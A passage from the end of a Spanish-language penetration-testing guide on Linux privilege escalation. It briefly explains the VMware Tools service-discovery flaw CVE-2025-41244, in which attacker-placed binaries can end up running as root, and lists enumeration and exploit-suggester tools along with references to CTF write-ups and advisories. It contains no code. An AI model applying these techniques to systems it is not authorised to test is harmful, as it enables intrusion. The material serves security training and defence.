El descubrimiento de servicios basado en regex en VMware Tools/Aria Operations puede extraer una ruta binaria de las líneas de comandos de los procesos y ejecutarla con -v bajo un contexto privilegiado. Los patrones permisivos (por ejemplo, usar \S) pueden coincidir con listeners preparados por un atacante en ubicaciones con permisos de escritura (por ejemplo, /tmp/httpd), lo que provoca la ejecución como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Obtén más información y consulta aquí un patrón generalizado aplicable a otros stacks de descubrimiento/monitorización:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Herramientas de Privesc para Linux/Unix

### **Mejor herramienta para buscar vectores locales de escalada de privilegios en Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opción -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerar vulnerabilidades del kernel en Linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Escalada de privilegios mediante la interfaz de Crontab, reutilización de credenciales de zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig falsificado para un monitor ejecutado por cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Bypass de Neighborhood Watch (secuestro de sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalada básica de privilegios en Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guía de escalada de privilegios en Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Atacar y defender: técnicas de escalada de privilegios en Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [¡Nadie espera la ejecución de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Escalada de privilegios en Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Tutorial de ejercicios de laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: consejos y trucos para la escalada de privilegios en Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: herramienta de enumeración y escalada de privilegios](https://github.com/rtcrowley/linux-private-i)
- [14] [¿Qué es un socket?](https://www.linux.com/news/what-socket/)
- [15] [Writeup de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Conéctate al D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Ejecutables SUID: escalada de privilegios en Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, parte 2 – Escalada de privilegios en Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Cómo gestionar ACLs en Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root en Redhat/CentOS mediante network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [¿Qué es systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (inyección de aritmética de bash mediante logs, cadena completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manual de GNU Bash – BASH_ENV (archivo de inicio no interactivo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + escalada de privilegios mediante symlink de TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copia de pg_basebackup mediante cron → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Tú lo nombras, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: elevación de privilegios mediante Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilidades de elevación de privilegios de Sudo CVE-2025-32462 y CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Directorios de repositorio PYC](https://peps.python.org/pep-3147/)
- [32] [Documentación de Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [Problema n.º 74 de polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Registro de contraseñas en Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Detalles de una condición de carrera de Logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
